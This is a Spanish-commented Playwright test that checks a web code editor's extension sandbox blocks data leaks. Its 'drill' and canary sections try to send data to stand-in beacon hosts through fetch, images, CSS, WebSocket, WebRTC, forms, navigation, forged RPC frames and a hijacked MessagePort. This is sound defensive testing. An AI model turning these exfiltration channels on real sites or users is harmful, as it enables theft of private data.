// Canario del nivel 2 (aceptación de la parte B2): una extensión intenta
// salir por cada canal que tiene, la página la pinta con todo envenenado, y
// nada puede llegar a la baliza.
//
//   node tests/x2_canary.mjs
//
// Montaje: Chromium con --host-resolver-rules (los *.test, open-vsx.org y
// openvsx.eclipsecontent.org van a la baliza; el bucle local y
// cdn.jsdelivr.net, normales; cualquier otro nombre no resuelve), un NetLog
// de la sesión, y la baliza (HTTP, HTTPS con certificado propio, WebSocket,
// toda conexión TCP y UDP para STUN). La página de Code lleva un vigía
// (MutationObserver) que apunta cualquier imagen, enlace, estilo o marco que
// apunte fuera.
//
// Fase A, con la extensión canario (tests/lib/x2-canary-ext.mjs):
//   W  cada canal del worker (red, almacenamiento de Code, portapapeles,
//      openExternal, tramas RPC hechas a mano);
//   P  lo que pinta la página: hover, detalles del autocompletado, firmas,
//      el hover de un diagnóstico, avisos, el modal, el selector, el cuadro de
//      texto, una acción de código y un autocompletado que abren direcciones,
//      Cmd+clic en una dirección del documento, la vista previa HTML de un
//      fichero que tocó la extensión y una escritura al portapapeles sin
//      gesto. Cada diálogo se cancela.
// Fase B: aceptar UNA dirección produce exactamente una visita, la de la URL
//   que enseñó el diálogo.
// Simulacro: código de ataque evaluado directamente en el marco del recinto y
//   en el del host de extensiones, como si ya estuvieran comprometidos.
// Controles positivos: sin la CSP del host el canario SÍ llega a la baliza;
//   el markdown hostil sin sanitize.js SÍ pinta una imagen y llega; el NetLog
//   SÍ ve una resolución de *.test pedida por la página y las del bucle local;
//   los canarios de almacenamiento SÍ se ven desde el mismo origen; y hay
//   mensajes de violación de CSP.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { chromium } from 'playwright';
import { startServer } from './lib/x2-server.mjs';
import { startBeacon } from './lib/beacon.mjs';
import { seed } from './lib/x2-fixtures.mjs';
import { CANARY_FULL } from './lib/x2-canary-ext.mjs';

let fails = 0, lastStep = 'start';
const ok = (name, c, extra = '') => { lastStep = name.slice(0, 40); console.log((c ? '✅' : '❌') + ' ' + name + (extra ? '  — ' + extra : '')); if (!c) fails++; };
const sleep = ms => new Promise(r => setTimeout(r, ms));
async function until(fn, { timeout = 20000, every = 150 } = {}) {
  const end = Date.now() + timeout;
  let v;
  while (Date.now() < end) { try { v = await fn(); if (v) return v; } catch { /* reintenta */ } await sleep(every); }
  return v;
}

const NETLOG = path.join(os.tmpdir(), `x2-canary-netlog-${process.pid}.json`);
const srv = await startServer();
const beacon = await startBeacon({ tls: true });
const browser = await chromium.launch({ args: [`--host-resolver-rules=${beacon.strictRules}`, `--log-net-log=${NETLOG}`] });
const ctx = await browser.newContext({ permissions: ['clipboard-read', 'clipboard-write'] });
await ctx.addInitScript(() => {
  try { localStorage.setItem('elffusscode.model', 'rules'); } catch { /* — */ }
  if (location.hostname !== '127.0.0.1') return;
  // vigía: nada del DOM de Code puede apuntar fuera de Code, del CDN de Monaco o de datos locales
  const OK = new Set([location.host, 'cdn.jsdelivr.net']);
  const outside = u => { try { const x = new URL(u, location.href); return /^(https?|wss?):$/.test(x.protocol) && !OK.has(x.host) && !(x.hostname === 'localhost' && /\/x2\/v1\//.test(x.pathname)); } catch { return false; } };
  const w = window.__x2watch = [];
  const look = n => {
    if (!(n instanceof Element)) return;
    for (const e of [n, ...n.querySelectorAll('*')]) {
      for (const a of ['src', 'href', 'srcset', 'poster', 'data', 'action']) { const v = e.getAttribute(a); if (v && outside(v.split(/\s+/)[0])) w.push(e.tagName + '[' + a + ']=' + v.slice(0, 120)); }
      const st = e.getAttribute('style');
      if (st && /url\(\s*['"]?(https?:)?\/\//i.test(st)) w.push(e.tagName + '[style]=' + st.slice(0, 120));
      if (e.tagName === 'STYLE' && /url\(\s*['"]?(https?:)?\/\//i.test(e.textContent)) w.push('STYLE=' + e.textContent.match(/url\([^)]*\)/i)[0].slice(0, 120));
      if (e.tagName === 'A' && e.getAttribute('href') && e.closest('.monaco-hover, .suggest-details, .parameter-hints-widget, .x2-toast, .x2-modal, .x2-pick')) w.push('A in widget=' + e.getAttribute('href').slice(0, 120));
    }
  };
  new MutationObserver(ms => { for (const m of ms) { if (m.type === 'attributes') look(m.target); else { for (const n of m.addedNodes) look(n.nodeType === 3 ? n.parentElement : n); } } })
    .observe(document, { subtree: true, childList: true, attributes: true, attributeFilter: ['src', 'href', 'srcset', 'style', 'poster', 'data', 'action'], characterData: true });
});
const page = await ctx.newPage();
const errors = [], cspMessages = [];
const onConsole = m => { if (/Content Security Policy/.test(m.text())) cspMessages.push(m.text().slice(0, 160)); };
page.on('console', onConsole);
page.on('worker', wk => { try { wk.on('console', onConsole); } catch { /* — */ } });
page.on('pageerror', e => { if (e.message !== 'Canceled') errors.push(String(e.message) + ' @ ' + String(e.stack || '').split('\n').slice(0, 3).join(' ').slice(0, 300) + ' (after: ' + lastStep + ')'); });
// Playwright también ve los intentos que la CSP para antes de salir (y la baliza
// no recibe): esos no cuentan. Cuenta lo que terminó, o falló por otra cosa.
const otherRequests = [];
const outsider = r => {
  const u = new URL(r.url());
  const fine = (u.origin === srv.codeOrigin) || u.host === 'cdn.jsdelivr.net' || u.protocol === 'data:' || u.protocol === 'blob:'
    || (u.origin === srv.sandboxOrigin && ['/x2/v1/sandbox.html', '/x2/v1/exthost-iframe.html'].includes(u.pathname));
  return !fine;
};
const cspBlocked = [];
ctx.on('requestfinished', r => { if (outsider(r)) otherRequests.push('finished ' + r.url().slice(0, 150)); });
ctx.on('requestfailed', r => {
  if (!outsider(r)) return;
  const why = r.failure()?.errorText || '';
  if (/BLOCKED_BY_CSP|csp/i.test(why)) cspBlocked.push(r.url()); else otherRequests.push('failed (' + why + ') ' + r.url().slice(0, 150));
});

// ── montaje: canarios de almacenamiento en el origen de Code y el proyecto ──
await page.goto(srv.codeOrigin + '/', { waitUntil: 'domcontentloaded' });
await page.evaluate(async () => {
  await new Promise((res, rej) => { const r = indexedDB.open('elffuss-canary', 1); r.onupgradeneeded = () => r.result.createObjectStore('s'); r.onsuccess = () => { r.result.close(); res(); }; r.onerror = () => rej(r.error); });
  localStorage.setItem('elffuss-canary', 'secret');
  document.cookie = 'elffuss_canary=secret; path=/';
  const o = await navigator.storage.getDirectory();
  const w = async (n, t) => { const f = await o.getFileHandle(n, { create: true }); const s = await f.createWritable(); await s.write(t); await s.close(); };
  await w('canary-opfs.txt', 'secret');
  await w('canary.js', 'function canary() {}\ncanary(\n');
  await w('page.html', '<p>page</p>\n');
  await w('plain.txt', 'see https://cmdclick.beacon.test/x?d=1 now\n');
});
const sameOrigin = await page.evaluate(async () => {
  const dbs = (await indexedDB.databases()).map(d => d.name);
  const o = await navigator.storage.getDirectory(); const names = []; for await (const k of o.keys()) names.push(k);
  return { idb: dbs.includes('elffuss-canary'), opfs: names.includes('canary-opfs.txt'), ls: localStorage.getItem('elffuss-canary') === 'secret', cookie: /elffuss_canary=secret/.test(document.cookie) };
});
ok('control 4: los canarios de almacenamiento SÍ se ven desde el origen de Code', sameOrigin.idb && sameOrigin.opfs && sameOrigin.ls && sameOrigin.cookie, JSON.stringify(sameOrigin));
await seed(page, [CANARY_FULL]);
await page.goto(srv.codeOrigin + '/?test-opfs', { waitUntil: 'domcontentloaded' });
await page.waitForFunction(() => !!window.monaco?.editor?.getEditors?.().length, null, { timeout: 30000 });
const open = p => page.evaluate(async p => { await (await import('/js/ide.js')).openFile(p); }, p);
const ed = fn => page.evaluate(fn);
const state = () => page.evaluate(async () => (await import('/js/ext2/bridge.js')).state());
const run = (id, ...args) => page.evaluate(([id, args]) => { window.__x2r = window.__x2r || {}; window.__x2r[id] = import('/js/ext2/bridge.js').then(b => b.runCommand(id, args.length ? args : undefined)); }, [id, args]);
const result = id => page.evaluate(id => window.__x2r[id], id);
const dialogUrl = () => until(() => page.evaluate(() => { const d = document.querySelector('#x2-open [role="dialog"]'); return d ? d.querySelector('.x2-code').textContent : null; }));
await open('canary.js');
await until(async () => (await state()).extensions.some(e => e.id === 'elffuss-test.canary' && e.state === 'active'), { timeout: 60000 });
await page.evaluate(() => navigator.clipboard.writeText('clipboard-secret'));

// ── W: los canales del worker ──
const sandboxPort = new URL(srv.sandboxOrigin).port;
await page.evaluate(([cp, sp]) => { window.__x2run = import('/js/ext2/bridge.js').then(b => b.runCommand('canary.run', [cp, sp])); }, [srv.port, sandboxPort]);
const openW = await dialogUrl();
ok('W openExternal: diálogo con la dirección entera', openW === 'http://open.beacon.test/x2-canary/open', String(openW));
await page.keyboard.press('Escape');
const report = JSON.parse(await page.evaluate(() => window.__x2run) || '[]');
const leaksW = report.filter(r => r.outcome === 'ALLOWED' && !/^own:/.test(r.detail));
ok(`W ${report.length} intentos desde el worker: todos bloqueados o locales`, report.length >= 30 && leaksW.length === 0, JSON.stringify(leaksW));
ok('W no ve IndexedDB, OPFS, localStorage ni cookies de Code', report.filter(r => ['indexedDB', 'opfs', 'localStorage', 'cookie'].includes(r.channel)).every(r => !/SAW/.test(r.detail)),
  JSON.stringify(report.filter(r => ['indexedDB', 'opfs', 'localStorage', 'cookie'].includes(r.channel))));
const tried = ch => report.find(r => r.channel === ch);
ok('W fuentes (FontFace) y Cache Storage existen en el worker y se intentan: bloqueadas por la política, no por faltar', ['fontface', 'caches-add'].every(ch => tried(ch)?.outcome === 'blocked' && !/^no /.test(tried(ch).detail)),
  JSON.stringify(['fontface', 'caches-add', 'websocketstream'].map(ch => [ch, tried(ch)?.outcome, tried(ch)?.detail?.slice(0, 120)])));
ok('W el portapapeles se lee vacío; guardar todo, rechazado', /read 0 chars/.test(report.find(r => r.channel === 'clipboard-api')?.detail || '') && report.find(r => r.channel === 'saveAll')?.outcome === 'blocked');

// ── P: lo que pinta la página ──
const widgetText = sel => page.evaluate(sel => { const w = [...document.querySelectorAll(sel)].find(x => x.offsetParent !== null && /canary/i.test(x.textContent)); return w ? { text: w.textContent.slice(0, 300), imgs: w.querySelectorAll('img').length, links: w.querySelectorAll('a[href]').length } : null; }, sel);
await ed(() => { const e = window.monaco.editor.getEditors()[0]; e.setPosition({ lineNumber: 1, column: 1 }); e.focus(); e.trigger('t', 'editor.action.showHover', {}); });
const hov = await until(() => widgetText('.monaco-hover'));
ok('P hover y diagnóstico: texto, sin <img> ni enlaces', !!hov && hov.imgs === 0 && hov.links === 0 && /!\[i\]\(http:\/\/md-img\.beacon\.test/.test(hov.text), JSON.stringify(hov));
await page.keyboard.press('Escape');
await ed(() => { const e = window.monaco.editor.getEditors()[0]; e.setPosition({ lineNumber: 2, column: 8 }); e.focus(); e.trigger('t', 'editor.action.triggerParameterHints', {}); });
const sig = await until(() => widgetText('.parameter-hints-widget'));
ok('P ayuda de firmas: texto, sin <img> ni enlaces', !!sig && sig.imgs === 0 && sig.links === 0, JSON.stringify(sig));
await page.keyboard.press('Escape');
await ed(() => { const e = window.monaco.editor.getEditors()[0]; const m = e.getModel(); m.setValue('function canary() {}\ncanary(\nzzc'); e.setPosition({ lineNumber: 3, column: 4 }); e.focus(); e.trigger('t', 'editor.action.triggerSuggest', {}); });
await until(() => page.evaluate(() => [...document.querySelectorAll('.suggest-widget .monaco-list-row')].some(r => /zzcanary/.test(r.textContent))));
await ed(() => window.monaco.editor.getEditors()[0].trigger('t', 'toggleSuggestionDetails', {}));
const sug = await until(() => widgetText('.suggest-details'), { timeout: 8000 });
ok('P detalles del autocompletado: texto, sin <img> ni enlaces', !!sug && sug.imgs === 0 && sug.links === 0, JSON.stringify(sug));
await page.keyboard.press('Enter');                            // acepta: texto con ${CLIPBOARD} y un comando que abre una dirección
const compUrl = await dialogUrl();
ok('P el comando de un autocompletado que abre una dirección pregunta con la dirección entera', compUrl === 'http://completioncmd.beacon.test/x2-canary/completioncmd', String(compUrl));
await page.keyboard.press('Escape');
const afterAccept = await ed(() => window.monaco.editor.getEditors()[0].getModel().getValue());
ok('P aceptar el autocompletado no mete el portapapeles en el documento (${CLIPBOARD} fuera)', !/clipboard-secret/.test(afterAccept) && /canary\s+x/.test(afterAccept), JSON.stringify(afterAccept));
await ed(() => { const e = window.monaco.editor.getEditors()[0]; e.setPosition({ lineNumber: 1, column: 1 }); e.focus(); e.trigger('t', 'editor.action.quickFix', {}); });
await until(() => page.evaluate(() => [...document.querySelectorAll('.action-widget .monaco-list-row, .action-widget li, .context-view .monaco-list-row')].some(r => /Canary/.test(r.textContent))), { timeout: 8000 });
const actionText = await page.evaluate(() => { const r = [...document.querySelectorAll('.action-widget .monaco-list-row, .action-widget li, .context-view .monaco-list-row')].find(x => /Canary/.test(x.textContent)); return r ? { text: r.textContent, els: r.querySelectorAll('b, img, a').length } : null; });
ok('P acción de código: su título como texto', !!actionText && actionText.els === 0 && /<b>fix<\/b>/.test(actionText.text), JSON.stringify(actionText));
await page.keyboard.press('Enter');
const actUrl = await dialogUrl();
ok('P la acción que abre una dirección pregunta con la dirección entera', actUrl === 'http://actioncmd.beacon.test/x2-canary/actioncmd', String(actUrl));
await page.keyboard.press('Escape');
// avisos, modal, selector, cuadro de texto, progreso
await run('canary.ui');
const toast = await until(() => page.evaluate(() => { const t = [...document.querySelectorAll('#x2-toasts .x2-toast')].find(x => /canary toast/.test(x.textContent)); return t ? { text: t.querySelector('.x2-toast-text').textContent.slice(0, 200), els: t.querySelectorAll('.x2-toast-text *, img, a').length, buttons: [...t.querySelectorAll('button')].map(b => b.textContent) } : null; }));
ok('P aviso: el texto y los botones como texto, sin elementos', !!toast && toast.els === 0 && toast.buttons.includes('Open <b>it</b>') && toast.buttons.includes('command:workbench.action.reloadWindow'), JSON.stringify(toast));
await page.click('#x2-toasts .x2-toast .x2-toast-close');
const modalBox = await until(() => page.evaluate(() => { const d = document.querySelector('#x2-dialog [role="dialog"]'); return d ? { text: d.textContent.slice(0, 200), els: d.querySelectorAll('img, a, b, style, svg').length } : null; }));
ok('P modal: texto, sin elementos', !!modalBox && modalBox.els === 0 && /canary modal <img/.test(modalBox.text), JSON.stringify(modalBox));
await page.keyboard.press('Escape');
const pick = await until(() => page.evaluate(() => { const p = document.getElementById('x2-pick'); return p && !p.classList.contains('x2-inputbox') ? { labels: [...p.querySelectorAll('.x2-pick-label')].map(x => x.textContent), els: p.querySelectorAll('img, a, b, svg').length, ph: p.querySelector('input').placeholder } : null; }));
ok('P selector: etiquetas como texto, sin iconos remotos ni elementos', !!pick && pick.els === 0 && /^canary <img/.test(pick.labels[0]) && pick.ph === 'canary <b>pick</b>', JSON.stringify(pick));
await page.keyboard.press('Escape');
const input = await until(() => page.evaluate(() => { const p = document.getElementById('x2-input'); return p ? { prompt: p.querySelector('.x2-input-prompt').textContent.slice(0, 80), els: p.querySelectorAll('img, a, b, svg, style').length } : null; }));
ok('P cuadro de texto: el aviso como texto', !!input && input.els === 0 && /^canary \*\*canary\*\*/.test(input.prompt), JSON.stringify(input));
await page.keyboard.press('Escape');
const uiRes = JSON.parse(await result('canary.ui') || '{}');
ok('P la extensión recibe «nada» de lo cancelado', uiRes.info === undefined && uiRes.modal === undefined && uiRes.pick === undefined && uiRes.input === undefined, JSON.stringify(uiRes));
// Cmd+clic en una dirección del documento
await open('plain.txt');
await ed(() => { const e = window.monaco.editor.getEditors()[0]; e.setPosition({ lineNumber: 1, column: 14 }); e.focus(); });
await sleep(400);
await ed(() => window.monaco.editor.getEditors()[0].getAction('editor.action.openLink').run());
const linkUrl = await dialogUrl();
ok('P Cmd+clic en una dirección del documento: diálogo con la dirección entera', linkUrl === 'https://cmdclick.beacon.test/x?d=1', String(linkUrl));
await page.keyboard.press('Escape');
// la vista previa HTML de un fichero que tocó la extensión
await open('page.html');
await page.evaluate(async () => (await import('/js/ext2/bridge.js')).runCommand('canary.edit'));
await until(async () => /preview\.beacon\.test/.test(await ed(() => window.monaco.editor.getEditors()[0].getModel().getValue())));
await page.click('#tabs-bar .tab.active', { button: 'right' });
await page.click('#tab-menu .tm-item:has-text("Vista previa")');
const gate = await until(() => page.evaluate(() => !!document.querySelector('#x2-preview [role="dialog"]')));
ok('P la vista previa de un HTML que tocó la extensión pregunta antes', !!gate);
await page.keyboard.press('Escape');
await sleep(400);
ok('P cancelada: sin vista previa', await page.evaluate(() => document.querySelectorAll('#md-preview-pane iframe').length === 0));
// portapapeles sin gesto (cada page.evaluate cuenta como gesto: se lanza a los 6 s)
await page.evaluate(() => { setTimeout(() => import('/js/ext2/bridge.js').then(b => b.runCommand('canary.clip')), 6000); });
await sleep(6500);
const dropped = await until(async () => ((await state()).ui?.dropped?.clipboard >= 1 ? 1 : null), { timeout: 8000 });
const clip = await page.evaluate(() => navigator.clipboard.readText().catch(() => 'ERR'));
ok('P escribir en el portapapeles sin gesto: descartado', !!dropped && clip === 'clipboard-secret', clip);
// tramas RPC hechas a mano
await open('canary.js');
await run('canary.forge');
const forgedUrl = await dialogUrl();
ok('W una trama $openUri hecha a mano solo llega al diálogo (con la dirección entera)', forgedUrl === 'https://forged.beacon.test/rpc?d=secret', String(forgedUrl));
await page.keyboard.press('Escape');
const forged = JSON.parse(await result('canary.forge') || '{}');
const dn = await until(async () => { const d = (await state()).denials; return d.top.some(([k]) => k === 'MainThreadCommands.dispose') ? d : null; });
ok('W tramas a métodos sin $, a un actor denegado y a uno que no existe: rechazadas y contadas', !!dn && dn.n >= 3 && dn.top.some(([k]) => /WebviewPanels\.\$createWebviewPanel/.test(k)) && dn.top.some(([k]) => /\$anything/.test(k)),
  JSON.stringify({ sent: forged.sent, denials: dn }));

// ── comprobaciones de la fase A ──
await sleep(1500);
const watchA = await page.evaluate(() => window.__x2watch.slice());
ok('vigía: ni imágenes, ni enlaces en los widgets, ni url() hacia fuera en el DOM de Code', watchA.length === 0, JSON.stringify(watchA.slice(0, 5)));
ok('baliza: 0 visitas, 0 conexiones TCP, 0 paquetes UDP', beacon.leaks().length === 0 && beacon.tcp.length === 0 && beacon.udp.length === 0, JSON.stringify({ hits: beacon.hits.slice(0, 3), tcp: beacon.tcp.length, udp: beacon.udp.length }));
ok('del navegador solo salió lo de Code, el CDN de Monaco y los dos documentos del recinto (el resto lo paró la CSP)', otherRequests.length === 0, otherRequests.slice(0, 5).join(' ') + ` · parados por la CSP: ${cspBlocked.length}`);
const tcpBefore = beacon.tcp.length;

// ── fase B: aceptar una dirección → exactamente una visita, la enseñada ──
const popupP = ctx.waitForEvent('page', { timeout: 20000 }).catch(() => null);
await run('canary.open', 'http://phaseb.beacon.test/exact?x=1');
const urlB = await dialogUrl();
// (vscode.Uri codifica el «=» de la consulta: lo que se abre, y se enseña, es eso)
ok('B el diálogo enseña la dirección que se abrirá', urlB === 'http://phaseb.beacon.test/exact?x%3D1', String(urlB));
await page.click('#x2-open button:has-text("Open in new tab")');
const popup = await popupP;
const hitB = await until(() => (beacon.leaks().length ? beacon.leaks() : null), { timeout: 15000 });
await sleep(1500);
ok('B exactamente una visita, a esa dirección', !!hitB && beacon.leaks().length === 1 && beacon.leaks()[0].host === 'phaseb.beacon.test' && 'http://phaseb.beacon.test' + beacon.leaks()[0].url === urlB, JSON.stringify(beacon.leaks()));
ok('B la extensión sabe que se abrió', (await result('canary.open')) === 'true');
await popup?.close();

// ── simulacro: el recinto y el host de extensiones ya comprometidos ──
const sbxFrame = page.frames().find(f => f.url().startsWith(srv.sandboxOrigin + '/x2/v1/sandbox.html'));
const hostFrame = page.frames().find(f => f.url().includes('/x2/v1/exthost-iframe.html'));
ok('simulacro: los dos marcos del recinto existen', !!sbxFrame && !!hostFrame);
const attack = async (frame, tag) => frame.evaluate(async tag => {
  const out = {};
  const T = n => `http://drill-${tag}-${n}.beacon.test/${n}`;
  const step = async (name, fn) => { try { out[name] = String(await fn()).slice(0, 120); } catch (e) { out[name] = 'blocked: ' + String(e && (e.message || e)).slice(0, 100); } };
  await step('fetch', () => fetch(T('fetch'), { mode: 'no-cors' }).then(r => 'ALLOWED ' + r.type));
  await step('image', () => new Promise((res, rej) => { const i = new Image(); i.onload = () => res('ALLOWED'); i.onerror = () => rej(new Error('img error')); i.src = T('img'); setTimeout(() => rej(new Error('img timeout')), 2000); }));
  await step('css-import', () => { const s = document.createElement('style'); s.textContent = `@import url(${T('import')});`; (document.head || document.documentElement).appendChild(s); return 'appended'; });
  await step('font-face', () => { const s = document.createElement('style'); s.textContent = `@font-face { font-family: d; src: url(${T('font')}); } body { font-family: d; }`; (document.head || document.documentElement).appendChild(s); const p = document.createElement('p'); p.textContent = 'x'; document.body.appendChild(p); return document.fonts.load('12px d').then(() => 'loaded?'); });
  await step('prefetch', () => { for (const rel of ['prefetch', 'preload', 'dns-prefetch', 'preconnect']) { const l = document.createElement('link'); l.rel = rel; l.href = T(rel); if (rel === 'preload') l.as = 'script'; document.head.appendChild(l); } return 'appended'; });
  await step('iframe', () => { const f = document.createElement('iframe'); f.src = T('iframe'); document.body.appendChild(f); return 'appended'; });
  await step('worker', () => { new Worker(T('worker')); return 'ALLOWED created'; });
  await step('sendBeacon', () => (navigator.sendBeacon(T('beacon'), 'x') ? 'queued (the beacon decides)' : 'refused'));
  await step('websocket', () => new Promise((res, rej) => { const w = new WebSocket(T('ws').replace('http', 'ws')); w.onopen = () => res('ALLOWED'); w.onerror = () => rej(new Error('ws error')); setTimeout(() => rej(new Error('ws timeout')), 2000); }));
  await step('rtc', () => { if (typeof RTCPeerConnection === 'undefined' || !RTCPeerConnection) throw new Error('no RTCPeerConnection'); const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:drill-stun.beacon.test:3478' }] }); pc.createDataChannel('x'); return pc.createOffer().then(o => pc.setLocalDescription(o)).then(() => 'ALLOWED'); });
  await step('notification', () => (typeof Notification === 'undefined' ? 'no Notification' : Notification.requestPermission()));
  await step('indexedDB', () => indexedDB.databases().then(d => d.map(x => x.name).join(',') || 'none'));
  await step('open', () => { const w = window.open(T('open')); return w ? 'ALLOWED' : 'null'; });
  await step('top', () => { top.location = T('top'); return 'assigned'; });
  await step('form', () => { const f = document.createElement('form'); f.action = T('form'); f.method = 'GET'; document.body.appendChild(f); f.submit(); return 'submitted'; });
  await step('meta-refresh', () => { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + T('meta'); document.head.appendChild(m); return 'appended'; });
  await step('anchor', () => { const a = document.createElement('a'); a.href = T('anchor'); document.body.appendChild(a); a.click(); return 'clicked'; });
  await step('location', () => { location.href = T('location'); return 'assigned'; });
  return out;
}, tag);
// (si un marco navegara de verdad, su contexto se destruiría: eso también es un fallo)
const drillS = await attack(sbxFrame, 's').catch(e => ({ crashed: 'ALLOWED? ' + String(e.message).slice(0, 120) }));
const drillH = await attack(hostFrame, 'h').catch(e => ({ crashed: 'ALLOWED? ' + String(e.message).slice(0, 120) }));
await sleep(3000);
const allowed = Object.entries({ ...Object.fromEntries(Object.entries(drillS).map(([k, v]) => ['s.' + k, v])), ...Object.fromEntries(Object.entries(drillH).map(([k, v]) => ['h.' + k, v])) }).filter(([, v]) => /ALLOWED/.test(v));
ok('simulacro: ningún intento sale (fetch, imagen, CSS, fuentes, prefetch, iframe, worker, beacon, WebSocket, WebRTC…)', allowed.length === 0, JSON.stringify(allowed));
ok('simulacro: ni una visita nueva a la baliza', beacon.leaks().length === 1 && beacon.udp.length === 0, JSON.stringify(beacon.leaks().slice(1, 4)));
ok('simulacro: las navegaciones se cancelan (los dos marcos siguen en su documento)', sbxFrame.url().includes('/x2/v1/sandbox.html') && hostFrame.url().includes('/x2/v1/exthost-iframe.html') && !!(await page.evaluate(() => !!document.getElementById('x2-sandbox'))));
ok('simulacro: el host de extensiones tampoco tiene WebRTC ni window.open', /no RTCPeerConnection/.test(drillH.rtc) && /blocked/.test(drillH.open), JSON.stringify({ rtc: drillH.rtc, open: drillH.open }));
ok('simulacro: IndexedDB del recinto, sin nada de Code', !/elffuss|canary/.test(drillS.indexedDB + drillH.indexedDB), drillS.indexedDB + ' | ' + drillH.indexedDB);
// mensajes del relevo falsificados: el puerto se roba parcheando MessagePort
await sbxFrame.evaluate(() => {
  const orig = MessagePort.prototype.postMessage;
  MessagePort.prototype.postMessage = function (...a) { window.__stolen = window.__stolen || this; return orig.apply(this, a); };
});
await page.evaluate(async () => (await import('/js/ext2/bridge.js')).stats());
const forgedSent = await sbxFrame.evaluate(() => {
  const p = window.__stolen;
  if (!p) return 0;
  const bad = [{ t: 'eval', code: 'x' }, { t: 'open.request', req: 1, url: 42 }, { t: 'ui.notify', req: 2, sev: 'html', text: '<img>', actions: [] }, { t: 'deco.set', key: 'a b', uri: 'x', ranges: [] }, { t: 'clipboard.write', text: 'x'.repeat(600000) }];
  let n = 0;
  for (let i = 0; i < 25; i++) { p.postMessage(bad[i % bad.length]); n++; }
  return n;
});
const torn = await until(async () => { const s = await state(); return s.state === 'error' && s.error?.code === 'violations' ? s : null; }, { timeout: 10000 });
ok('simulacro: mensajes falsificados del relevo rechazados y contados; demasiados desmontan el recinto', forgedSent === 25 && !!torn && !(await page.evaluate(() => !!document.getElementById('x2-sandbox'))), JSON.stringify(torn?.error));

// ── controles positivos en esta misma sesión ──
// 2. el markdown hostil SIN sanitize.js sí pinta una imagen y llega a la baliza
await open('canary.js');
await page.evaluate(() => {
  window.monaco.languages.registerHoverProvider('javascript', { provideHover: () => ({ contents: [{ value: '![b](http://bypass.beacon.test/b.png) <img src="http://bypass2.beacon.test/c.png">', isTrusted: true, supportHtml: true }] }) });
  const e = window.monaco.editor.getEditors()[0]; e.setPosition({ lineNumber: 1, column: 3 }); e.focus(); e.trigger('t', 'editor.action.showHover', {});
});
const bypass = await until(() => (beacon.leaks().some(h => /bypass/.test(h.host)) ? beacon.leaks().filter(h => /bypass/.test(h.host)) : null), { timeout: 15000 });
const bypassImg = await page.evaluate(() => [...document.querySelectorAll('.monaco-hover img')].some(i => /bypass/.test(i.src)));
ok('control 2: sin sanitize.js el mismo markdown SÍ pinta <img> y llega a la baliza', !!bypass && bypassImg, JSON.stringify(bypass));
// 3. una resolución de *.test pedida por la página (sin X-DNS-Prefetch-Control) sale en el NetLog
await page.evaluate(() => {
  const l = document.createElement('link'); l.rel = 'dns-prefetch'; l.href = '//prefetch-control.test'; document.head.appendChild(l);
  return fetch('http://netlog-control.test/', { mode: 'no-cors' }).catch(() => {});
});
await sleep(1500);
ok('control 5: hubo mensajes de violación de CSP (los intentos se bloquearon, no se perdieron)', cspMessages.length > 0, String(cspMessages.length));
const realErrors = errors.filter(e => !/beacon\.test|Elffuss Code does not let extensions|violat|importScripts/i.test(String(e)));
ok('sin errores de página fuera de lo provocado', realErrors.length === 0, JSON.stringify(realErrors.slice(0, 4)));
await browser.close();

// ── NetLog: ninguna resolución de *.test salvo los controles y la fase B ──
let netlog = '';
try { netlog = fs.readFileSync(NETLOG, 'utf8'); } catch { /* — */ }
if (!process.env.X2_KEEP_NETLOG) fs.rmSync(NETLOG, { force: true }); else console.log('   NetLog kept at ' + NETLOG);
const names = [...new Set((netlog.match(/[a-z0-9-]+(?:\.[a-z0-9-]+)*\.test\b/gi) || []).map(s => s.toLowerCase()))];
// («beacon.test» a secas es el sitio de la pestaña de la fase B en su clave de aislamiento, no una resolución)
const expected = new Set(['phaseb.beacon.test', 'beacon.test', 'bypass.beacon.test', 'bypass2.beacon.test', 'netlog-control.test', 'prefetch-control.test']);
const unexpected = names.filter(n => !expected.has(n));
ok('control 3: el NetLog SÍ ve la resolución que pidió la página (netlog-control.test)', names.includes('netlog-control.test'), names.join(' '));
ok('control 6: el NetLog SÍ ve las resoluciones del bucle local', /"localhost"|localhost:/.test(netlog));
const where = n => { const i = netlog.toLowerCase().indexOf(n); return netlog.slice(Math.max(0, i - 80), i + n.length + 40).replace(/\s+/g, ' '); };
ok('NetLog: ninguna resolución de los nombres del canario ni del simulacro', netlog.length > 0 && unexpected.length === 0, unexpected.slice(0, 4).map(n => n + ' ← ' + where(n)).join(' | '));
console.log(`   (dns-prefetch del control en el NetLog: ${names.includes('prefetch-control.test') ? 'sí' : 'no, el navegador sin cabeza no lo hace'})`);

// ── control 1: sin la CSP del host de extensiones, el canario SÍ sale ──
{
  const open2 = await startServer({ insecure: 'exthost' });
  const b2 = await chromium.launch({ args: [`--host-resolver-rules=${beacon.resolverRules}`] });
  const c2 = await b2.newContext();
  await c2.addInitScript(() => { try { localStorage.setItem('elffusscode.model', 'rules'); } catch { /* — */ } });
  const p2 = await c2.newPage();
  await p2.goto(open2.codeOrigin + '/', { waitUntil: 'domcontentloaded' });
  await p2.evaluate(async () => { const o = await navigator.storage.getDirectory(); const f = await o.getFileHandle('a.js', { create: true }); const s = await f.createWritable(); await s.write('x\n'); await s.close(); });
  await seed(p2, [CANARY_FULL]);
  await p2.goto(open2.codeOrigin + '/?test-opfs', { waitUntil: 'domcontentloaded' });
  await p2.waitForFunction(() => !!window.monaco?.editor?.getEditors?.().length, null, { timeout: 30000 });
  await p2.evaluate(async () => { await (await import('/js/ide.js')).openFile('a.js'); });
  await until(() => p2.evaluate(async () => (await import('/js/ext2/bridge.js')).state().extensions.some(e => e.state === 'active')), { timeout: 60000 });
  const before = beacon.leaks().length;
  await p2.evaluate(([cp, sp]) => { window.__r = import('/js/ext2/bridge.js').then(b => b.runCommand('canary.run', [cp, sp])); }, [open2.port, new URL(open2.sandboxOrigin).port]);
  if (await until(() => p2.evaluate(() => !!document.querySelector('#x2-open')), { timeout: 30000 })) await p2.keyboard.press('Escape');
  const rep2 = JSON.parse(await p2.evaluate(() => window.__r) || '[]');
  await sleep(1500);
  ok('control 1: sin la CSP del host de extensiones, el mismo canario SÍ llega a la baliza', beacon.leaks().length > before && rep2.some(r => r.channel === 'fetch-http' && r.outcome === 'ALLOWED'), `hits ${beacon.leaks().length - before}`);
  await b2.close();
  await open2.close();
}

await beacon.close();
await srv.close();
console.log(fails ? `\n❌ ${fails} failed` : '\n✅ all passed');
